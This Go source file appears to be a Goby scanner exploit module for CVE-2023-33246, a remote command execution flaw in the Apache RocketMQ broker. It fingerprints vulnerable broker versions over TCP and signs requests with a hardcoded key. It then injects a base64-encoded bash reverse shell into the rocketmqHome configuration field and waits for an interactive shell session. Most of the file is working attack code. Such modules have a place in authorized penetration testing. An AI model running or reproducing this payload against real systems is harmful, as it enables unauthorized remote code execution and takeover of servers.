package exploits

import (
	"crypto/hmac"
	"crypto/sha1"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "RocketMQ Broker rocketmqHome Config Remote Command Execution Vulnerability (CVE-2023-33246)",
    "Description": "<p>Apache RocketMQ is a lightweight data processing platform and messaging engine developed by the Apache Software Foundation in the United States.</p><p>There is a code injection vulnerability in Apache RocketMQ 5.1.0 and earlier versions, which originates from a remote command execution vulnerability. Attackers can exploit this vulnerability to execute commands with system user privileges using the update configuration function.</p>",
    "Product": "RocketMq-Console-Ng",
    "Homepage": "https://rocketmq.apache.org/",
    "DisclosureDate": "2023-05-24",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "protocol=\"rocketmq-broker\"",
    "GobyQuery": "protocol=\"rocketmq-broker\"",
    "Level": "3",
    "Impact": "<p>There is a code injection vulnerability in Apache RocketMQ 5.1.0 and earlier versions, which originates from a remote command execution vulnerability. Attackers can exploit this vulnerability to execute commands with system user privileges using the update configuration function.</p>",
    "Recommendation": "<p>Currently, the vendor has released an upgrade patch to fix the vulnerability. For more details, please visit the vendor's homepage at <a href=\"https://github.com/apache/rocketmq\">https://github.com/apache/rocketmq</a>.</p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-33246"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "reverse",
            "type": "select",
            "value": "linux",
            "show": ""
        },
        {
            "name": "warning",
            "type": "textarea",
            "value": "漏洞利用可能影响目标业务稳定性，请谨慎使用",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "aaa",
        "Content": "漏洞利用潜在风险，使用时需谨慎。"
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-33246"
    ],
    "CNNVD": [
        "CNNVD-202305-2101"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "RocketMQ Broker rocketmqHome Config 远程命令执行漏洞（CVE-2023-33246）",
            "Product": "RocketMq-console-ng",
            "Description": "<p>Apache RocketMQ是美国 Apache 基金会的一款轻量级的数据处理平台和消息传递引擎。&nbsp;</p><p>Apache RocketMQ 5.1.0及之前版本存在代码注入漏洞，该漏洞源于存在远程命令执行漏洞，攻击者可以利用该漏洞利用更新配置功能以系统用户身份执行命令。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"https://github.com/apache/rocketmq\" target=\"_blank\">https://github.com/apache/rocketmq</a></p>",
            "Impact": "<p>Apache RocketMQ 5.1.0及之前版本存在代码注入漏洞，该漏洞源于存在远程命令执行漏洞，攻击者可以利用该漏洞利用更新配置功能以系统用户身份执行命令。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "RocketMQ Broker rocketmqHome Config Remote Command Execution Vulnerability (CVE-2023-33246)",
            "Product": "RocketMq-Console-Ng",
            "Description": "<p>Apache RocketMQ is a lightweight data processing platform and messaging engine developed by the Apache Software Foundation in the United States.</p><p>There is a code injection vulnerability in Apache RocketMQ 5.1.0 and earlier versions, which originates from a remote command execution vulnerability. Attackers can exploit this vulnerability to execute commands with system user privileges using the update configuration function.</p>",
            "Recommendation": "<p>Currently, the vendor has released an upgrade patch to fix the vulnerability. For more details, please visit the vendor's homepage at <a href=\"https://github.com/apache/rocketmq\" target=\"_blank\">https://github.com/apache/rocketmq</a>.</p>",
            "Impact": "<p>There is a code injection vulnerability in Apache RocketMQ 5.1.0 and earlier versions, which originates from a remote command execution vulnerability. Attackers can exploit this vulnerability to execute commands with system user privileges using the update configuration function.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10797"
}`

	findJSONFlagPqNhdJ := func(data string) string {
		start := strings.Index(data, "{")
		for _, idx := range regexp.MustCompile(`\}`).FindAllStringIndex(data, -1) {
			endIndex := idx[0]
			tmpData := data[start : endIndex+1]
			if json.Valid([]byte(tmpData)) {
				return tmpData
			}
		}
		return ""
	}

	getVersionFlagPqNhdJ := func(data map[string]interface{}) string {
		versionIndex := int(data["version"].(float64))
		versionList := []string{"V3_0_0_SNAPSHOT", "V3_0_0_ALPHA1", "V3_0_0_BETA1", "V3_0_0_BETA2", "V3_0_0_BETA3", "V3_0_0_BETA4", "V3_0_0_BETA5", "V3_0_0_BETA6_SNAPSHOT", "V3_0_0_BETA6", "V3_0_0_BETA7_SNAPSHOT", "V3_0_0_BETA7", "V3_0_0_BETA8_SNAPSHOT", "V3_0_0_BETA8", "V3_0_0_BETA9_SNAPSHOT", "V3_0_0_BETA9", "V3_0_0_FINAL", "V3_0_1_SNAPSHOT", "V3_0_1", "V3_0_2_SNAPSHOT", "V3_0_2", "V3_0_3_SNAPSHOT", "V3_0_3", "V3_0_4_SNAPSHOT", "V3_0_4", "V3_0_5_SNAPSHOT", "V3_0_5", "V3_0_6_SNAPSHOT", "V3_0_6", "V3_0_7_SNAPSHOT", "V3_0_7", "V3_0_8_SNAPSHOT", "V3_0_8", "V3_0_9_SNAPSHOT", "V3_0_9", "V3_0_10_SNAPSHOT", "V3_0_10", "V3_0_11_SNAPSHOT", "V3_0_11", "V3_0_12_SNAPSHOT", "V3_0_12", "V3_0_13_SNAPSHOT", "V3_0_13", "V3_0_14_SNAPSHOT", "V3_0_14", "V3_0_15_SNAPSHOT", "V3_0_15", "V3_1_0_SNAPSHOT", "V3_1_0", "V3_1_1_SNAPSHOT", "V3_1_1", "V3_1_2_SNAPSHOT", "V3_1_2", "V3_1_3_SNAPSHOT", "V3_1_3", "V3_1_4_SNAPSHOT", "V3_1_4", "V3_1_5_SNAPSHOT", "V3_1_5", "V3_1_6_SNAPSHOT", "V3_1_6", "V3_1_7_SNAPSHOT", "V3_1_7", "V3_1_8_SNAPSHOT", "V3_1_8", "V3_1_9_SNAPSHOT", "V3_1_9", "V3_2_0_SNAPSHOT", "V3_2_0", "V3_2_1_SNAPSHOT", "V3_2_1", "V3_2_2_SNAPSHOT", "V3_2_2", "V3_2_3_SNAPSHOT", "V3_2_3", "V3_2_4_SNAPSHOT", "V3_2_4", "V3_2_5_SNAPSHOT", "V3_2_5", "V3_2_6_SNAPSHOT", "V3_2_6", "V3_2_7_SNAPSHOT", "V3_2_7", "V3_2_8_SNAPSHOT", "V3_2_8", "V3_2_9_SNAPSHOT", "V3_2_9", "V3_3_1_SNAPSHOT", "V3_3_1", "V3_3_2_SNAPSHOT", "V3_3_2", "V3_3_3_SNAPSHOT", "V3_3_3", "V3_3_4_SNAPSHOT", "V3_3_4", "V3_3_5_SNAPSHOT", "V3_3_5", "V3_3_6_SNAPSHOT", "V3_3_6", "V3_3_7_SNAPSHOT", "V3_3_7", "V3_3_8_SNAPSHOT", "V3_3_8", "V3_3_9_SNAPSHOT", "V3_3_9", "V3_4_1_SNAPSHOT", "V3_4_1", "V3_4_2_SNAPSHOT", "V3_4_2", "V3_4_3_SNAPSHOT", "V3_4_3", "V3_4_4_SNAPSHOT", "V3_4_4", "V3_4_5_SNAPSHOT", "V3_4_5", "V3_4_6_SNAPSHOT", "V3_4_6", "V3_4_7_SNAPSHOT", "V3_4_7", "V3_4_8_SNAPSHOT", "V3_4_8", "V3_4_9_SNAPSHOT", "V3_4_9", "V3_5_1_SNAPSHOT", "V3_5_1", "V3_5_2_SNAPSHOT", "V3_5_2", "V3_5_3_SNAPSHOT", "V3_5_3", "V3_5_4_SNAPSHOT", "V3_5_4", "V3_5_5_SNAPSHOT", "V3_5_5", "V3_5_6_SNAPSHOT", "V3_5_6", "V3_5_7_SNAPSHOT", "V3_5_7", "V3_5_8_SNAPSHOT", "V3_5_8", "V3_5_9_SNAPSHOT", "V3_5_9", "V3_6_1_SNAPSHOT", "V3_6_1", "V3_6_2_SNAPSHOT", "V3_6_2", "V3_6_3_SNAPSHOT", "V3_6_3", "V3_6_4_SNAPSHOT", "V3_6_4", "V3_6_5_SNAPSHOT", "V3_6_5", "V3_6_6_SNAPSHOT", "V3_6_6", "V3_6_7_SNAPSHOT", "V3_6_7", "V3_6_8_SNAPSHOT", "V3_6_8", "V3_6_9_SNAPSHOT", "V3_6_9", "V3_7_1_SNAPSHOT", "V3_7_1", "V3_7_2_SNAPSHOT", "V3_7_2", "V3_7_3_SNAPSHOT", "V3_7_3", "V3_7_4_SNAPSHOT", "V3_7_4", "V3_7_5_SNAPSHOT", "V3_7_5", "V3_7_6_SNAPSHOT", "V3_7_6", "V3_7_7_SNAPSHOT", "V3_7_7", "V3_7_8_SNAPSHOT", "V3_7_8", "V3_7_9_SNAPSHOT", "V3_7_9", "V3_8_1_SNAPSHOT", "V3_8_1", "V3_8_2_SNAPSHOT", "V3_8_2", "V3_8_3_SNAPSHOT", "V3_8_3", "V3_8_4_SNAPSHOT", "V3_8_4", "V3_8_5_SNAPSHOT", "V3_8_5", "V3_8_6_SNAPSHOT", "V3_8_6", "V3_8_7_SNAPSHOT", "V3_8_7", "V3_8_8_SNAPSHOT", "V3_8_8", "V3_8_9_SNAPSHOT", "V3_8_9", "V3_9_1_SNAPSHOT", "V3_9_1", "V3_9_2_SNAPSHOT", "V3_9_2", "V3_9_3_SNAPSHOT", "V3_9_3", "V3_9_4_SNAPSHOT", "V3_9_4", "V3_9_5_SNAPSHOT", "V3_9_5", "V3_9_6_SNAPSHOT", "V3_9_6", "V3_9_7_SNAPSHOT", "V3_9_7", "V3_9_8_SNAPSHOT", "V3_9_8", "V3_9_9_SNAPSHOT", "V3_9_9", "V4_0_0_SNAPSHOT", "V4_0_0", "V4_0_1_SNAPSHOT", "V4_0_1", "V4_0_2_SNAPSHOT", "V4_0_2", "V4_0_3_SNAPSHOT", "V4_0_3", "V4_0_4_SNAPSHOT", "V4_0_4", "V4_0_5_SNAPSHOT", "V4_0_5", "V4_0_6_SNAPSHOT", "V4_0_6", "V4_0_7_SNAPSHOT", "V4_0_7", "V4_0_8_SNAPSHOT", "V4_0_8", "V4_0_9_SNAPSHOT", "V4_0_9", "V4_1_0_SNAPSHOT", "V4_1_0", "V4_1_1_SNAPSHOT", "V4_1_1", "V4_1_2_SNAPSHOT", "V4_1_2", "V4_1_3_SNAPSHOT", "V4_1_3", "V4_1_4_SNAPSHOT", "V4_1_4", "V4_1_5_SNAPSHOT", "V4_1_5", "V4_1_6_SNAPSHOT", "V4_1_6", "V4_1_7_SNAPSHOT", "V4_1_7", "V4_1_8_SNAPSHOT", "V4_1_8", "V4_1_9_SNAPSHOT", "V4_1_9", "V4_2_0_SNAPSHOT", "V4_2_0", "V4_2_1_SNAPSHOT", "V4_2_1", "V4_2_2_SNAPSHOT", "V4_2_2", "V4_2_3_SNAPSHOT", "V4_2_3", "V4_2_4_SNAPSHOT", "V4_2_4", "V4_2_5_SNAPSHOT", "V4_2_5", "V4_2_6_SNAPSHOT", "V4_2_6", "V4_2_7_SNAPSHOT", "V4_2_7", "V4_2_8_SNAPSHOT", "V4_2_8", "V4_2_9_SNAPSHOT", "V4_2_9", "V4_3_0_SNAPSHOT", "V4_3_0", "V4_3_1_SNAPSHOT", "V4_3_1", "V4_3_2_SNAPSHOT", "V4_3_2", "V4_3_3_SNAPSHOT", "V4_3_3", "V4_3_4_SNAPSHOT", "V4_3_4", "V4_3_5_SNAPSHOT", "V4_3_5", "V4_3_6_SNAPSHOT", "V4_3_6", "V4_3_7_SNAPSHOT", "V4_3_7", "V4_3_8_SNAPSHOT", "V4_3_8", "V4_3_9_SNAPSHOT", "V4_3_9", "V4_4_0_SNAPSHOT", "V4_4_0", "V4_4_1_SNAPSHOT", "V4_4_1", "V4_4_2_SNAPSHOT", "V4_4_2", "V4_4_3_SNAPSHOT", "V4_4_3", "V4_4_4_SNAPSHOT", "V4_4_4", "V4_4_5_SNAPSHOT", "V4_4_5", "V4_4_6_SNAPSHOT", "V4_4_6", "V4_4_7_SNAPSHOT", "V4_4_7", "V4_4_8_SNAPSHOT", "V4_4_8", "V4_4_9_SNAPSHOT", "V4_4_9", "V4_5_0_SNAPSHOT", "V4_5_0", "V4_5_1_SNAPSHOT", "V4_5_1", "V4_5_2_SNAPSHOT", "V4_5_2", "V4_5_3_SNAPSHOT", "V4_5_3", "V4_5_4_SNAPSHOT", "V4_5_4", "V4_5_5_SNAPSHOT", "V4_5_5", "V4_5_6_SNAPSHOT", "V4_5_6", "V4_5_7_SNAPSHOT", "V4_5_7", "V4_5_8_SNAPSHOT", "V4_5_8", "V4_5_9_SNAPSHOT", "V4_5_9", "V4_6_0_SNAPSHOT", "V4_6_0", "V4_6_1_SNAPSHOT", "V4_6_1", "V4_6_2_SNAPSHOT", "V4_6_2", "V4_6_3_SNAPSHOT", "V4_6_3", "V4_6_4_SNAPSHOT", "V4_6_4", "V4_6_5_SNAPSHOT", "V4_6_5", "V4_6_6_SNAPSHOT", "V4_6_6", "V4_6_7_SNAPSHOT", "V4_6_7", "V4_6_8_SNAPSHOT", "V4_6_8", "V4_6_9_SNAPSHOT", "V4_6_9", "V4_7_0_SNAPSHOT", "V4_7_0", "V4_7_1_SNAPSHOT", "V4_7_1", "V4_7_2_SNAPSHOT", "V4_7_2", "V4_7_3_SNAPSHOT", "V4_7_3", "V4_7_4_SNAPSHOT", "V4_7_4", "V4_7_5_SNAPSHOT", "V4_7_5", "V4_7_6_SNAPSHOT", "V4_7_6", "V4_7_7_SNAPSHOT", "V4_7_7", "V4_7_8_SNAPSHOT", "V4_7_8", "V4_7_9_SNAPSHOT", "V4_7_9", "V4_8_0_SNAPSHOT", "V4_8_0", "V4_8_1_SNAPSHOT", "V4_8_1", "V4_8_2_SNAPSHOT", "V4_8_2", "V4_8_3_SNAPSHOT", "V4_8_3", "V4_8_4_SNAPSHOT", "V4_8_4", "V4_8_5_SNAPSHOT", "V4_8_5", "V4_8_6_SNAPSHOT", "V4_8_6", "V4_8_7_SNAPSHOT", "V4_8_7", "V4_8_8_SNAPSHOT", "V4_8_8", "V4_8_9_SNAPSHOT", "V4_8_9", "V4_9_0_SNAPSHOT", "V4_9_0", "V4_9_1_SNAPSHOT", "V4_9_1", "V4_9_2_SNAPSHOT", "V4_9_2", "V4_9_3_SNAPSHOT", "V4_9_3", "V4_9_4_SNAPSHOT", "V4_9_4", "V4_9_5_SNAPSHOT", "V4_9_5", "V4_9_6_SNAPSHOT", "V4_9_6", "V4_9_7_SNAPSHOT", "V4_9_7", "V4_9_8_SNAPSHOT", "V4_9_8", "V4_9_9_SNAPSHOT", "V4_9_9", "V5_0_0_SNAPSHOT", "V5_0_0", "V5_0_1_SNAPSHOT", "V5_0_1", "V5_0_2_SNAPSHOT", "V5_0_2", "V5_0_3_SNAPSHOT", "V5_0_3", "V5_0_4_SNAPSHOT", "V5_0_4", "V5_0_5_SNAPSHOT", "V5_0_5", "V5_0_6_SNAPSHOT", "V5_0_6", "V5_0_7_SNAPSHOT", "V5_0_7", "V5_0_8_SNAPSHOT", "V5_0_8", "V5_0_9_SNAPSHOT", "V5_0_9", "V5_1_0_SNAPSHOT", "V5_1_0", "V5_1_1_SNAPSHOT", "V5_1_1", "V5_1_2_SNAPSHOT", "V5_1_2", "V5_1_3_SNAPSHOT", "V5_1_3", "V5_1_4_SNAPSHOT", "V5_1_4", "V5_1_5_SNAPSHOT", "V5_1_5", "V5_1_6_SNAPSHOT", "V5_1_6", "V5_1_7_SNAPSHOT", "V5_1_7", "V5_1_8_SNAPSHOT", "V5_1_8", "V5_1_9_SNAPSHOT", "V5_1_9", "V5_2_0_SNAPSHOT", "V5_2_0", "V5_2_1_SNAPSHOT", "V5_2_1", "V5_2_2_SNAPSHOT", "V5_2_2", "V5_2_3_SNAPSHOT", "V5_2_3", "V5_2_4_SNAPSHOT", "V5_2_4", "V5_2_5_SNAPSHOT", "V5_2_5", "V5_2_6_SNAPSHOT", "V5_2_6", "V5_2_7_SNAPSHOT", "V5_2_7", "V5_2_8_SNAPSHOT", "V5_2_8", "V5_2_9_SNAPSHOT", "V5_2_9", "V5_3_0_SNAPSHOT", "V5_3_0", "V5_3_1_SNAPSHOT", "V5_3_1", "V5_3_2_SNAPSHOT", "V5_3_2", "V5_3_3_SNAPSHOT", "V5_3_3", "V5_3_4_SNAPSHOT", "V5_3_4", "V5_3_5_SNAPSHOT", "V5_3_5", "V5_3_6_SNAPSHOT", "V5_3_6", "V5_3_7_SNAPSHOT", "V5_3_7", "V5_3_8_SNAPSHOT", "V5_3_8", "V5_3_9_SNAPSHOT", "V5_3_9", "V5_4_0_SNAPSHOT", "V5_4_0", "V5_4_1_SNAPSHOT", "V5_4_1", "V5_4_2_SNAPSHOT", "V5_4_2", "V5_4_3_SNAPSHOT", "V5_4_3", "V5_4_4_SNAPSHOT", "V5_4_4", "V5_4_5_SNAPSHOT", "V5_4_5", "V5_4_6_SNAPSHOT", "V5_4_6", "V5_4_7_SNAPSHOT", "V5_4_7", "V5_4_8_SNAPSHOT", "V5_4_8", "V5_4_9_SNAPSHOT", "V5_4_9", "V5_5_0_SNAPSHOT", "V5_5_0", "V5_5_1_SNAPSHOT", "V5_5_1", "V5_5_2_SNAPSHOT", "V5_5_2", "V5_5_3_SNAPSHOT", "V5_5_3", "V5_5_4_SNAPSHOT", "V5_5_4", "V5_5_5_SNAPSHOT", "V5_5_5", "V5_5_6_SNAPSHOT", "V5_5_6", "V5_5_7_SNAPSHOT", "V5_5_7", "V5_5_8_SNAPSHOT", "V5_5_8", "V5_5_9_SNAPSHOT", "V5_5_9", "V5_6_0_SNAPSHOT", "V5_6_0", "V5_6_1_SNAPSHOT", "V5_6_1", "V5_6_2_SNAPSHOT", "V5_6_2", "V5_6_3_SNAPSHOT", "V5_6_3", "V5_6_4_SNAPSHOT", "V5_6_4", "V5_6_5_SNAPSHOT", "V5_6_5", "V5_6_6_SNAPSHOT", "V5_6_6", "V5_6_7_SNAPSHOT", "V5_6_7", "V5_6_8_SNAPSHOT", "V5_6_8", "V5_6_9_SNAPSHOT", "V5_6_9", "V5_7_0_SNAPSHOT", "V5_7_0", "V5_7_1_SNAPSHOT", "V5_7_1", "V5_7_2_SNAPSHOT", "V5_7_2", "V5_7_3_SNAPSHOT", "V5_7_3", "V5_7_4_SNAPSHOT", "V5_7_4", "V5_7_5_SNAPSHOT", "V5_7_5", "V5_7_6_SNAPSHOT", "V5_7_6", "V5_7_7_SNAPSHOT", "V5_7_7", "V5_7_8_SNAPSHOT", "V5_7_8", "V5_7_9_SNAPSHOT", "V5_7_9", "V5_8_0_SNAPSHOT", "V5_8_0", "V5_8_1_SNAPSHOT", "V5_8_1", "V5_8_2_SNAPSHOT", "V5_8_2", "V5_8_3_SNAPSHOT", "V5_8_3", "V5_8_4_SNAPSHOT", "V5_8_4", "V5_8_5_SNAPSHOT", "V5_8_5", "V5_8_6_SNAPSHOT", "V5_8_6", "V5_8_7_SNAPSHOT", "V5_8_7", "V5_8_8_SNAPSHOT", "V5_8_8", "V5_8_9_SNAPSHOT", "V5_8_9", "V5_9_0_SNAPSHOT", "V5_9_0", "V5_9_1_SNAPSHOT", "V5_9_1", "V5_9_2_SNAPSHOT", "V5_9_2", "V5_9_3_SNAPSHOT", "V5_9_3", "V5_9_4_SNAPSHOT", "V5_9_4", "V5_9_5_SNAPSHOT", "V5_9_5", "V5_9_6_SNAPSHOT", "V5_9_6", "V5_9_7_SNAPSHOT", "V5_9_7", "V5_9_8_SNAPSHOT", "V5_9_8", "V5_9_9_SNAPSHOT", "V5_9_9", "HIGHER_VERSION"}
		if len(versionList) > versionIndex {
			return strings.Replace(versionList[versionIndex], "_", ".", -1)
		}
		return ""
	}

	sendCheckPayloadFlagPqNhdJ := func(conn net.Conn) string {
		helloData, err := hex.DecodeString("000000b4000000b07b22636f6465223a32362c226578744669656c6473223a7b224163636573734b6579223a22526f636b65744d51222c225369676e6174757265223a224955633872724f2f306744636838436a4f624c51735732727369413d227d2c22666c6167223a302c226c616e6775616765223a224a415641222c226f7061717565223a302c2273657269616c697a655479706543757272656e74525043223a224a534f4e222c2276657273696f6e223a3433337d")
		if err != nil {
			return ""
		}
		_, err = conn.Write(helloData)
		if err != nil {
			return ""
		}
		resp := make([]byte, 0)
		buf := make([]byte, 1024)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				// 处理读取错误
				break
			}
			resp = append(resp, buf[:n]...)
			if n < len(buf) {
				break // 数据已经全部读取完毕
			}
		}
		return string(resp)
	}

	checkFlagPqNhdJ := func(conn net.Conn) (bool, string) {
		resp := sendCheckPayloadFlagPqNhdJ(conn)
		jsonString := findJSONFlagPqNhdJ(resp)
		if jsonString == "" {
			return false, ""
		}
		data := map[string]interface{}{}
		err := json.Unmarshal([]byte(jsonString), &data)
		if err != nil {
			return false, ""
		}
		code := int(data["code"].(float64))
		if code != 0 {
			return false, ""
		}
		version := getVersionFlagPqNhdJ(data)
		if strings.HasPrefix(version, "V4.9.") {
			minorVersion, _ := strconv.Atoi(strings.Split(version, ".")[2])
			if minorVersion < 6 {
				return true, resp
			} else {
				return false, resp
			}
		} else if strings.HasPrefix(version, "V5.1.") {
			minorVersion, _ := strconv.Atoi(strings.Split(version, ".")[2])
			if minorVersion < 1 {
				return true, resp
			} else {
				return false, resp
			}
		} else if strings.HasPrefix(version, "V5.0") {
			return true, resp
		}
		return true, ""
	}

	// 计算请求签名
	getSignatureFlagPqNhdJ := func(accessKey []byte, payload []byte) string {
		secretKey := []byte("12345678")
		content := make([]byte, len(accessKey)+len(payload))
		copy(content[0:], accessKey)
		copy(content[len(accessKey):], payload)
		// 创建一个 HmacSHA1 实例
		h := hmac.New(sha1.New, secretKey)
		// 添加要计算的数据
		h.Write(content)
		return base64.StdEncoding.EncodeToString(h.Sum(nil))
	}

	getRocketmqHomeFlagPqNhdJ := func(str string) string {
		re := regexp.MustCompile(`rocketmqHome=(.*)`)
		match := re.FindStringSubmatch(str)
		if len(match) > 0 {
			return match[1]
		}
		return ""
	}

	sendExpFlagPqNhdJ := func(body []byte, conn net.Conn) {
		accessKey := []byte("RocketMQ")
		signature := getSignatureFlagPqNhdJ(accessKey, body)
		remotingCommand := make(map[string]interface{})
		json.Unmarshal([]byte(`{"code":25,"extFields":{"AccessKey":"RocketMQ","Signature":"`+signature+`"},"flag":0,"language":"JAVA","opaque":3,"serializeTypeCurrentRPC":"JSON","version":433}`), &remotingCommand)
		header, _ := json.Marshal(remotingCommand)
		dataLength := make([]byte, 4)
		// 开始的4字节为 header + payload + 4
		binary.BigEndian.PutUint32(dataLength, uint32(4+len(header)+len(body)))
		protocolTypeLength := make([]byte, 4)
		// 写入数据标识 和序列化方式
		binary.BigEndian.PutUint32(protocolTypeLength, (0x00<<24)|uint32((len(header))&0x00FFFFFF))
		data := append(dataLength, protocolTypeLength...)
		// 写入 header
		data = append(data, header...)
		// 写入 body
		data = append(data, body...)
		// 构造发包请求
		conn.Write(data)
		// 再次读取
		_, resp := checkFlagPqNhdJ(conn)
		fmt.Println("RocketMQHome:" + getRocketmqHomeFlagPqNhdJ(resp))
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			conn, err := httpclient.GetTCPConn(u.HostInfo, time.Second*10)
			if err != nil {
				return false
			}
			defer conn.Close()
			success, _ := checkFlagPqNhdJ(conn)
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			reverse := goutils.B2S(ss.Params["reverse"])
			if reverse != "linux" {
				expResult.Success = false
				expResult.Output = "未知的反弹方式"
				return expResult
			}
			// 监测漏洞是否存在
			conn, err := httpclient.GetTCPConn(expResult.HostInfo.HostInfo, time.Second*60)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			success, resp := checkFlagPqNhdJ(conn)
			fmt.Println("RocketMQHome:" + getRocketmqHomeFlagPqNhdJ(resp))
			expResult.Success = success
			if !expResult.Success {
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			waitSessionCh := make(chan string)
			rp, err := godclient.WaitSession("reverse_"+reverse, waitSessionCh)
			if err != nil || len(rp) == 0 {
				expResult.Success = false
				expResult.Output = "无可用反弹端口"
			}
			cmd := ""
			if reverse == "linux" {
				// 4759a80803061887 为：rocketmq-framework-goby
				cmd = "kill -9 `ps aux | grep 4759a80803061887 | grep -v \"grep\" | tr -s ' '| cut -d ' ' -f 2` && nohup " + godclient.ReverseTCPByBash(rp)
				cmd = "-c $@|sh . echo echo \"" + base64.StdEncoding.EncodeToString([]byte(cmd)) + "\"|base64 -d|bash -i && exit 0;4759a80803061887"
			}
			// 开始执行 EXP
			body := []byte(`filterServerNums=1
rocketmqHome=` + cmd + `
`)
			sendExpFlagPqNhdJ(body, conn)
			select {
			case webConsoleID := <-waitSessionCh:
				if u, err := url.Parse(webConsoleID); err == nil {
					expResult.Success = true
					expResult.OutputType = "html"
					sid := strings.Join(u.Query()["id"], "")
					expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
				}
			case <-time.After(time.Second * 60 * 2):
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
			}
			defer conn.Close()
			return expResult
		},
	))
}
